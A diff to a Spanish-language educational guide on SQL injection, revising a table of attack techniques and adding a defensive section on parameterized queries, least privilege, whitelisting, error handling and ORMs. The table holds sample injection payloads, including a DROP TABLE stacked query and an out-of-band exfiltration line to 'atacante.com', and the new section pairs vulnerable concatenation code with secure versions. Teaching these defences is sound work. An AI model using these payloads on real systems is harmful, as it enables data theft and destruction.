@@ -63,14 +63,138 @@ Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evolu
 |---|---|---|---|---|
 | **In-Band** | **Basada en Errores** | El atacante introduce instrucciones SQL malformadas con el propósito de provocar errores controlados en el motor de base de datos. Los mensajes de error generados pueden revelar información sensible, como nombres de tablas, columnas, rutas del sistema, versiones del SGBD o detalles de la configuración interna. | `' OR 1=CONVERT(int,(SELECT @@version)) --` | Durante la ejecución de un CRUD de productos, una excepción no controlada genera un código HTTP 500 y expone el *stack trace* completo, revelando el nombre de la base de datos, el tipo de gestor utilizado y parte de la consulta ejecutada. |
 | **In-Band** | **Basada en UNION** | Aprovecha el operador `UNION SELECT` para combinar el resultado de una consulta maliciosa con el de una consulta legítima. Para que el ataque sea exitoso, ambas consultas deben poseer el mismo número de columnas y tipos de datos compatibles. | `' UNION SELECT 1, version(), current_database() --` | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios limitados intercepta la petición `GET /api/categorias?id=1` e inyecta una consulta `UNION` para obtener identificadores de inquilinos (`tenant_id`) y credenciales de otros administradores almacenadas en la base de datos. |
-| **Inferencial** | **Basada en Booleanos (Boolean-Based)** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
-| **Inferencial** | **Basada en Tiempo (Time-Based)** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
+| **Inferencial** | **Basada en Booleanos** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
+| **Inferencial** | **Basada en Tiempo** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
 | **Consultas Apiladas** | **Ataques Destructivos / DDL-DML** | Consiste en finalizar la consulta original mediante un punto y coma (`;`) y concatenar instrucciones adicionales, como `DROP`, `UPDATE`, `INSERT` o `DELETE`. Su viabilidad depende de las restricciones impuestas por el controlador de conexión y la configuración del motor de base de datos. | `1'); DROP TABLE categorias_crud; --` | En determinadas configuraciones de PostgreSQL, un uso incorrecto del controlador de acceso puede permitir la ejecución de múltiples sentencias en una sola petición. En consecuencia, un atacante podría modificar o eliminar datos críticos mediante instrucciones concatenadas. |
 | **Out-of-Band** | **Exfiltración Externa** | Se emplea cuando no es posible obtener información mediante respuestas directas o técnicas inferenciales. El atacante induce al motor de base de datos a realizar comunicaciones externas, como consultas DNS o solicitudes HTTP, enviando los datos extraídos hacia un servidor bajo su control. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(SQL Server)* | Tras ejecutar el payload, el servidor de base de datos realiza una resolución DNS hacia un dominio controlado por el atacante, por ejemplo `password_robada.atacante.com`. El atacante posteriormente analiza los registros de su servidor para recuperar la información exfiltrada. |
 
-> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales (Blind)** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band (OOB)** emplean canales externos de comunicación para la extracción de información.
+> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band** emplean canales externos de comunicación para la extracción de información.
 
-## Mejores Prácticas de Mitigación
+**Mejores Prácticas de Mitigación**
+
+La prevención de las vulnerabilidades de inyección SQL no depende de un único mecanismo de protección, sino de la implementación de una estrategia de **defensa en profundidad (*Defense in Depth*)**, en la que múltiples controles de seguridad operan de manera complementaria. Bajo este enfoque, si una capa de seguridad es comprometida, las restantes limitan el alcance del ataque y reducen significativamente su impacto.
+
+Las siguientes prácticas constituyen las medidas fundamentales para prevenir y mitigar los ataques de SQL Injection en el desarrollo de *backends* modernos.
+
+---
+
+### Consultas Preparadas (*Parameterized Queries*): El Estándar de Oro
+
+Las consultas preparadas representan el mecanismo más eficaz y ampliamente recomendado para prevenir la inyección SQL. Su funcionamiento se basa en una separación estricta entre la lógica de la consulta y los datos proporcionados por el usuario.
+
+En lugar de construir instrucciones SQL mediante concatenación de cadenas de texto, el motor de la base de datos compila primero la estructura de la consulta y, posteriormente, incorpora los valores recibidos en marcadores de posición (*placeholders*) previamente definidos. Como consecuencia, cualquier entrada enviada por el usuario es interpretada únicamente como un dato y nunca como una instrucción ejecutable.
+
+De esta manera, intentos de inyección como `OR 1=1`, `UNION SELECT` o `DROP TABLE` son tratados como texto ordinario, impidiendo que modifiquen la consulta original.
+
+**Ejemplos de implementación**
+
+| **Entorno / Lenguaje** | **Implementación Vulnerable (Concatenación)** | **Implementación Segura (Parametrización)** |
+|---|---|---|
+| **Node.js + MySQL (`mysql2`)** | `const query = \`SELECT * FROM usuarios WHERE email = '${email_input}'\`;`<br>`connection.query(query, (err, res) => {...});` | `const query = 'SELECT * FROM usuarios WHERE email = ?';`<br>`connection.execute(query, [email_input], (err, res) => {...});` |
+| **Python + PostgreSQL (`psycopg2`)** | `query = f"SELECT * FROM usuarios WHERE username = '{user_input}'"`<br>`cursor.execute(query)` | `query = "SELECT * FROM usuarios WHERE username = %s"`<br>`cursor.execute(query, (user_input,))` |
+
+En las implementaciones seguras, el controlador de conexión (*driver*) recibe los parámetros por separado y realiza el tratamiento adecuado de los datos, evitando que sean interpretados como parte de la sentencia SQL.
+
+---
+
+### Principio de Menor Privilegio (*Least Privilege*)
+
+Una arquitectura segura debe asumir que ninguna medida de protección es infalible. Por ello, las cuentas utilizadas por la aplicación para conectarse a la base de datos deben disponer exclusivamente de los permisos estrictamente necesarios para desempeñar sus funciones.
+
+**Recomendaciones principales:**
+
+- Utilizar credenciales específicas para cada módulo de la aplicación.
+- Evitar el uso de cuentas administrativas globales, como `sa` o `postgres`.
+- Conceder únicamente los permisos de lectura y escritura indispensables.
+- Restringir la ejecución de instrucciones de definición de datos (DDL), tales como `DROP`, `ALTER`, `TRUNCATE` y `CREATE`.
+
+La aplicación de este principio disminuye considerablemente el impacto potencial de un ataque exitoso, ya que limita las acciones que un atacante puede realizar sobre la base de datos.
+
+---
+
+### Validación y Sanitización Estricta de Entradas (*Whitelisting*)
+
+La validación de datos constituye una capa adicional de protección que debe ejecutarse antes de que la información alcance la capa de acceso a datos (*Data Access Layer*). Su objetivo es garantizar que las entradas cumplan con el tipo, formato y restricciones previamente definidos por la aplicación.
+
+**Validación de tipos de datos**
+
+Si un *endpoint* espera un identificador numérico, el sistema debe verificar explícitamente que el valor recibido sea un entero válido.
+
+**Solicitud esperada:**
+
+```http
+GET /api/categorias?id=1
+```
+
+**Intento de inyección:**
+
+```http
+GET /api/categorias?id=1 UNION SELECT password FROM usuarios
+```
+
+La petición debe rechazarse inmediatamente debido a que el parámetro recibido no cumple con el tipo de dato esperado.
+
+**Uso de listas blancas (*Whitelisting*)**
+
+Existen elementos de la consulta, como los nombres de columnas utilizados en `ORDER BY`, que no pueden parametrizarse directamente. En estos casos, la aplicación debe aceptar únicamente valores previamente autorizados.
+
+```javascript
+const columnasPermitidas = ['nombre', 'fecha', 'precio'];
+```
+
+**Solicitud válida:**
+
+```http
+GET /productos?sort=nombre
+```
+
+**Solicitud maliciosa:**
+
+```http
+GET /productos?sort=nombre; DROP TABLE productos
+```
+
+La segunda petición debe ser rechazada automáticamente, ya que el valor recibido no coincide con ninguno de los elementos definidos en la lista blanca.
+
+---
+
+### Manejo Seguro de Errores y Excepciones
+
+Los mensajes de error producidos por la base de datos no deben exponerse directamente al cliente. La divulgación de excepciones, consultas SQL, nombres de tablas o versiones del gestor de base de datos proporciona información valiosa para un atacante durante las etapas de reconocimiento y explotación.
+
+**Buenas prácticas recomendadas:**
+
+- Registrar los errores detallados únicamente en archivos de *logs* internos.
+- Devolver mensajes genéricos al usuario final.
+- Evitar la exposición de *stack traces* y consultas SQL en las respuestas HTTP.
+
+**Respuesta insegura:**
+
+```text
+ERROR: relation "usuarios" does not exist
+```
+
+**Respuesta recomendada:**
+
+```text
+Ha ocurrido un error al procesar la solicitud.
+```
+
+---
+
+### Uso de ORM y Marcos de Acceso a Datos Seguros
+
+Los marcos de persistencia de datos (*Object Relational Mapping - ORM*), como Hibernate, Sequelize, Entity Framework o SQLAlchemy, implementan mecanismos de parametrización de manera predeterminada.
+
+Aunque su utilización no elimina completamente el riesgo de SQL Injection, sí reduce significativamente la probabilidad de introducir vulnerabilidades derivadas de la construcción manual de consultas mediante concatenación de cadenas.
+
+Sin embargo, las consultas nativas (*Raw SQL Queries*) deben emplearse con precaución y respetando las mismas prácticas de parametrización, validación y control de permisos descritas anteriormente.
+
+---
+
+> **Idea clave:** La mitigación efectiva de SQL Injection requiere la combinación de múltiples controles de seguridad. Las consultas parametrizadas, el principio de menor privilegio, la validación estricta de entradas, el manejo seguro de errores y el uso adecuado de frameworks de acceso a datos constituyen un enfoque de defensa en profundidad que reduce drásticamente la superficie de ataque y fortalece la seguridad de las aplicaciones backend modernas.
+
+
 
 ## Prevención en Backends Modernos
 
